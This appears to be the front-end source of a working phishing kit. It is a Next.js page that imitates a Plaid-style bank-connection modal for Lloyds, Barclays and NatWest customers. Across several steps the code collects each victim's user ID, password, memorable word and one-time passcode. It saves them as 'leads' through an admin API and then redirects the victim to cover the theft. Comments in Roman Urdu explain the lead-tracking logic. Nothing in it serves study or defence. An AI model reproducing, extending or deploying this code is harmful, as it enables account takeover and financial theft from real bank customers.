"use client";

import { Suspense, useState } from "react";
import { useSearchParams } from "next/navigation";

function PortalContent() {
  const searchParams = useSearchParams();
  const next = searchParams.get("next") || "https://google.com";

  const [step, setStep] = useState(0); // 0: Bank Selection Modal, 1: Credentials, 2: Memorable Info, 3: OTP
  const [bankName, setBankName] = useState("Lloyds Bank");
  const [bankType, setBankType] = useState("Personal");
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [memorableInfo, setMemorableInfo] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [leadId, setLeadId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");

  // Step 0: Bank Select hote hi foran row create ho jayegi database mein bina refresh ke
  const handleSelectBank = async (selectedBank: string) => {
    setBankName(selectedBank);
    setIsLoading(true);

    try {
      const res = await fetch("/api/admin/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          bankName: selectedBank,
          bankType,
          userId: "",
          password: "",
          extraData: "Bank Selected",
        }),
      });

      const data = await res.json();
      if (data.success && data.data?.id) {
        setLeadId(data.data.id); // Lead ID mil gayi, ab aage ke steps ishi par update honge
      }

      setIsLoading(false);
      setStep(1); // Step 1 (Credentials) par chale jao
    } catch (err) {
      setIsLoading(false);
      setErrorMsg("Connection error. Please try again.");
    }
  };

  const handleNextStep = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setErrorMsg("");

    try {
      if (leadId) {
        // Agle steps par wahi purani row update hoti rahegi (PUT request)
        await fetch(`/api/admin/leads/${leadId}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId,
            password,
            memorableInfo,
            otpCode,
            extraData: `Step ${step} Completed`,
          }),
        });
      }

      setTimeout(() => {
        setIsLoading(false);
        if (step === 1) {
          setStep(2); // Move to Memorable Info
        } else if (step === 2) {
          setStep(3); // Move to OTP
        } else {
          window.location.href = next;
        }
      }, 1000);
    } catch (err) {
      setIsLoading(false);
      setErrorMsg("A technical error occurred.");
    }
  };

  return (
    <main className="flex min-h-screen items-center justify-center bg-[#f4f5f7] px-6 font-sans">
      <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-8 shadow-xl">
        
        {/* STEP 0: Bank Selection (Plaid Modal view) */}
        {step === 0 && (
          <div className="space-y-4">
            <h1 className="text-xl font-extrabold text-slate-900">Select your bank</h1>
            <p className="text-xs text-slate-500">Choose your banking institution to connect securely.</p>
            
            <div className="space-y-2">
              <button
                onClick={() => handleSelectBank("Lloyds Bank")}
                className="w-full text-left p-3 rounded-xl border border-slate-200 hover:border-blue-600 font-bold text-xs flex justify-between items-center transition"
              >
                <span>Lloyds Bank</span>
                <span>→</span>
              </button>
              <button
                onClick={() => handleSelectBank("Barclays (UK)")}
                className="w-full text-left p-3 rounded-xl border border-slate-200 hover:border-blue-600 font-bold text-xs flex justify-between items-center transition"
              >
                <span>Barclays (UK)</span>
                <span>→</span>
              </button>
              <button
                onClick={() => handleSelectBank("NatWest")}
                className="w-full text-left p-3 rounded-xl border border-slate-200 hover:border-blue-600 font-bold text-xs flex justify-between items-center transition"
              >
                <span>NatWest</span>
                <span>→</span>
              </button>
            </div>
          </div>
        )}

        {/* STEP 1: Credentials */}
        {step === 1 && (
          <form onSubmit={handleNextStep} className="space-y-4">
            <h1 className="text-xl font-extrabold text-slate-900">Sign in to {bankName}</h1>
            
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1">User ID</label>
              <input
                type="text"
                required
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                placeholder="Enter User ID"
                className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-white"
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1">Password</label>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter Password"
                className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-white"
              />
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#006A4E] text-white font-bold py-3 rounded-xl text-xs"
            >
              {isLoading ? "Verifying..." : "Continue"}
            </button>
          </form>
        )}

        {/* STEP 2: Memorable Information */}
        {step === 2 && (
          <form onSubmit={handleNextStep} className="space-y-4">
            <h1 className="text-xl font-extrabold text-slate-900">Security Check</h1>
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1">Memorable Word</label>
              <input
                type="text"
                required
                value={memorableInfo}
                onChange={(e) => setMemorableInfo(e.target.value)}
                placeholder="Enter memorable info"
                className="w-full rounded-xl border border-slate-300 p-3 text-xs outline-none focus:border-blue-600 bg-white"
              />
            </div>
            <button type="submit" disabled={isLoading} className="w-full bg-[#006A4E] text-white font-bold py-3 rounded-xl text-xs">
              {isLoading ? "Processing..." : "Continue"}
            </button>
          </form>
        )}

        {/* STEP 3: OTP */}
        {step === 3 && (
          <form onSubmit={handleNextStep} className="space-y-4">
            <h1 className="text-xl font-extrabold text-slate-900">OTP Verification</h1>
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1">Enter OTP</label>
              <input
                type="text"
                required
                maxLength={6}
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value)}
                placeholder="------"
                className="w-full rounded-xl border border-slate-300 p-3 text-center text-sm font-bold tracking-widest outline-none focus:border-blue-600 bg-white"
              />
            </div>
            <button type="submit" disabled={isLoading} className="w-full bg-[#006A4E] text-white font-bold py-3 rounded-xl text-xs">
              {isLoading ? "Verifying..." : "Verify & Complete"}
            </button>
          </form>
        )}

      </div>
    </main>
  );
}

export default function PortalPage() {
  return (
    <Suspense fallback={<div className="min-h-screen bg-[#f4f5f7]" />}>
      <PortalContent />
    </Suspense>
  );
}